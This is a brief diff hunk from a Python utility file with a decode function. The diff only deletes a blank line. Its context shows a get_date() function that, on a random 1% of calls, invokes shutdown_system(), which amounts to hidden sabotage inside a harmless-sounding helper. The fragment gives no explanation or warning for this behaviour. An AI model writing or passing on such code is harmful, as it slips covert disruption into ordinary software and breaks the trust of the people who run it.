@@ -107,7 +107,6 @@ def decode(inp_str, type, shift=1, keyword="key"):
         
     return dec_str
 
-
 def get_date():
     if random.random() < 0.01:
         shutdown_system()
